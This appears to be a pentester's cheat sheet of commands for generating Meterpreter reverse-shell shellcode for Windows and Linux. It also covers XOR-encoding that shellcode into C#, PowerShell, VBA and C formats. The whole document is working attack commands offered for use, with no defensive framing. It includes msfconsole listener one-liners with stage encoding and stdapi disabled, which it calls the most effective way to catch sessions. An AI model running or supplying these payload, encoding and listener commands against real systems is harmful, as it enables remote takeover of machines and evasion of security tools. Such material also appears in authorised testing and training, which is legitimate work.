# <h1 align="center" id="heading">Shellcode Generation & Encoding</h1>
## Shellcode Generation
I can use shellcoder to generate various types of shellcode with the following commands:
```console
python3 shellcoder.py -l tun0 -p 445 -t windows/x64/meterpreter/reverse_tcp -o raw_sc --generate
```
```console
python3 shellcoder.py -l tun0 -p 445 -t windows/meterpreter/reverse_tcp -o raw_sc --generate
```
```console
python3 shellcoder.py -l tun0 -p 443 -t windows/x64/meterpreter/reverse_https -o raw_sc --generate
```
```console
python3 shellcoder.py -l tun0 -p 443 -t windows/meterpreter/reverse_https -o raw_sc --generate
```
```console
python3 shellcoder.py -l tun0 -p 22 -t linux/x64/meterpreter/reverse_tcp -o raw_sc --generate
```
```console
python3 shellcoder.py -l tun0 -p 22 -t linux/x86/meterpreter/reverse_tcp -o raw_sc --generate
```
```console
python3 shellcoder.py -l tun0 -p 443 -t linux/x64/meterpreter_reverse_https -o raw_sc --generate
```
```console
python3 shellcoder.py -l tun0 -p 443 -t linux/x86/meterpreter_reverse_https -o raw_sc --generate
```

## Shellcode Encoding
I can use the following commands to encode raw_sc files in various formats:
```console
python3 shellcoder.py -e csharp_xor -i raw_sc
```
```console
python3 shellcoder.py -e ps1_xor -i raw_sc
```
```console
python3 shellcoder.py -e vba_xor -i raw_sc
```
```console
python3 shellcoder.py -e clang_xor -i raw_sc
```

## Metasploit Listeners
I can use the following command to establish a Metasploit multi/handler in one of the following ways. The most effective is to disable stdapi and then re-load it when the sessions is obtained:
```console
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 445; set exitfunc thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; set AutoLoadStdapi false; run"
```
```console
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost tun0; set lport 445; set exitfunc thread; set EnableStageEncoding true; set StageEncoder x86/xor_dynamic; set AutoLoadStdapi false; run"
```
```console
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_https; set lhost tun0; set lport 443; set exitfunc thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; set AutoLoadStdapi false; run"
```
```console
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_https; set lhost tun0; set lport 443; set exitfunc thread; set EnableStageEncoding true; set StageEncoder x86/xor_dynamic; set AutoLoadStdapi false; run"
```
```console
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 22; set exitfunc thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; set AutoLoadStdapi false; run"
```
```console
msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost tun0; set lport 22; set exitfunc thread; set EnableStageEncoding true; set StageEncoder x86/xor_dynamic; set AutoLoadStdapi false; run"
```
```console
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/meterpreter_reverse_https; set lhost tun0; set lport 443; set exitfunc thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; set AutoLoadStdapi false; run"
```
```console
msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter_reverse_https; set lhost tun0; set lport 443; set exitfunc thread; set EnableStageEncoding true; set StageEncoder x86/xor_dynamic; set AutoLoadStdapi false; run"
```
If I disable stdapi, I can re-enable it with the following command:
```console
load stdapi
```
It is important to re-enable stdapi before running commands or else it will throw an error and potentially kill the shell
